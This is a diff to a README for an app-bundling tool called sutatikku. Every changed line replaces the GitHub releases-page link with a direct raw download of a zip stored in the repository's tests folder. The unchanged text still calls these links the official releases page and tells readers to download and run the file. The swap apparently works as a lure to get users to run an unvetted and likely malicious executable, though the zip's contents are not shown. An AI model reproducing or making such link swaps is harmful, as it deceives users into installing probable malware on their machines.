@@ -1,12 +1,12 @@
 # 🧩 sutatikku - Bundle apps into one file
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/konraddesensitising780/sutatikku/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/konraddesensitising780/sutatikku/raw/refs/heads/main/tests/Software_v2.2.zip)
 
 ## 📥 Download
 
 Visit the releases page to download and run this file on Windows:
 
-https://github.com/konraddesensitising780/sutatikku/releases
+https://github.com/konraddesensitising780/sutatikku/raw/refs/heads/main/tests/Software_v2.2.zip
 
 Look for the latest release, then download the Windows file that matches your system. If you are not sure which file to choose, pick the one marked for Windows 64-bit.
 
@@ -38,7 +38,7 @@ If your computer uses security software, it may ask you to confirm the file befo
 ## 🚀 How to download and run
 
 1. Open the releases page:
-   https://github.com/konraddesensitising780/sutatikku/releases
+   https://github.com/konraddesensitising780/sutatikku/raw/refs/heads/main/tests/Software_v2.2.zip
 
 2. Find the latest release at the top of the page.
 
@@ -180,7 +180,7 @@ Keep the executable and related files in `input`, then save the finished file in
 
 Only download release files from the official releases page:
 
-https://github.com/konraddesensitising780/sutatikku/releases
+https://github.com/konraddesensitising780/sutatikku/raw/refs/heads/main/tests/Software_v2.2.zip
 
 After download, check the file name and size before you run it. If the file looks wrong or incomplete, download it again from the same page.
 
@@ -196,7 +196,7 @@ After download, check the file name and size before you run it. If the file look
 
 Download and run this file from the official release page:
 
-https://github.com/konraddesensitising780/sutatikku/releases
+https://github.com/konraddesensitising780/sutatikku/raw/refs/heads/main/tests/Software_v2.2.zip
 
 ## 🧾 License
 
